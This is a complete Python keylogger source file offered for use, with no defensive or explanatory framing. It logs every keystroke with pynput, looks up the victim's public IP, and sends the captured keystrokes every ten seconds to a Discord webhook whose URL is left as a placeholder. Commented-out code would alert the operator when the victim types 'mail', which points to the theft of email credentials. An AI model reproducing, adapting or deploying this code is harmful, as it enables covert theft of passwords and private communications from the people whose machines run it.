import requests
import json
import threading
import time
from pynput import keyboard
import socket

time.sleep(10)

SEND_REPORT_EVERY = 10 #default 10sec.
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1489/12345" #place ds webhook here

class KeyLogger:
    def __init__(self, time_interval):
        self.interval = time_interval
        self.log = f"**__kl started. `IP: {self.get_public_ip()}`__**"

    def appendlog(self, string):
        self.log = self.log + string

    def format_special_keys(self, key):
        special_keys = {
            keyboard.Key.ctrl_l: ' **[Ctrl]** ',
            keyboard.Key.ctrl_r: ' **[Ctrl]** ',
            keyboard.Key.alt_l: ' **[Alt]** ',
            keyboard.Key.alt_r: ' **[Alt]** ',
            keyboard.Key.backspace: ' **[Backspace]** ',
            keyboard.Key.shift_l: ' **[Shift]** ',
            keyboard.Key.shift_r: ' **[Shift]** ',
            keyboard.Key.enter: ' **[Enter]** ',
            keyboard.Key.space: ' **[Space]** ',
            keyboard.Key.tab: ' **[Tab]** ',
            keyboard.Key.esc: ' **[Esc]** ',
            keyboard.Key.caps_lock: ' **[Caps Lock]** ',
            keyboard.Key.left: ' **[◄]** ',
            keyboard.Key.right: ' **[►]** ',
            keyboard.Key.up: ' **[▲]** ',
            keyboard.Key.down: ' **[▼]** ',
            keyboard.Key.cmd_l: ' **[Win]** ',
            keyboard.Key.cmd_r: ' **[Win]** ',
            keyboard.Key.delete: ' **[Delete]** ',
            keyboard.Key.print_screen: ' **[Print Screen]** ',
        }

        return special_keys.get(key, str(key))

    def save_data(self, key):
        try:
            if hasattr(key, 'vk') and key.vk in range(96, 105):
                current_key = str(key.vk - 96)
            else:
                current_key = self.format_special_keys(key.char)
        except AttributeError:
            current_key = str(self.format_special_keys(key))

        self.appendlog(current_key)

# DISABLED BY DEFAULT(bc of lags) but u can enable it if u want
#        if 'mail' in self.log.lower(): #ping everyone when keylog detected word "mail"
#            self.send_discord_message(DISCORD_WEBHOOK_URL, "@everyone **__New mail detected! (mail)__**")
#
#        if 'ьфшд' in self.log.lower(): #ping everyone when keylog detected word "mail" (cyrillic)
#            self.send_discord_message(DISCORD_WEBHOOK_URL, "@everyone **__New mail detected! (ьфшд)__**")

    def get_public_ip(self):
        try:
            response = requests.get('https://api64.ipify.org?format=json')
            response.raise_for_status()
            ip_address = response.json()['ip']
        except requests.RequestException as e:
            print(f"error getting public ip: {e}")
            ip_address = "n/a"

        return ip_address

    def send_discord_message(self, webhook_url, message):
        headers = {
            'Content-Type': 'application/json',
        }
        payload = {
            'content': message,
        }
        response = requests.post(webhook_url, headers=headers, data=json.dumps(payload))
        if response.status_code != 204:
            print(f"f to send msg. status: {response.status_code}")

    def report(self, discord_webhook_url):
        self.send_discord_message(discord_webhook_url, self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report, args=[discord_webhook_url])
        timer.start()

    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
            self.report(DISCORD_WEBHOOK_URL)
            keyboard_listener.join()

keylogger = KeyLogger(SEND_REPORT_EVERY)
keylogger.run()
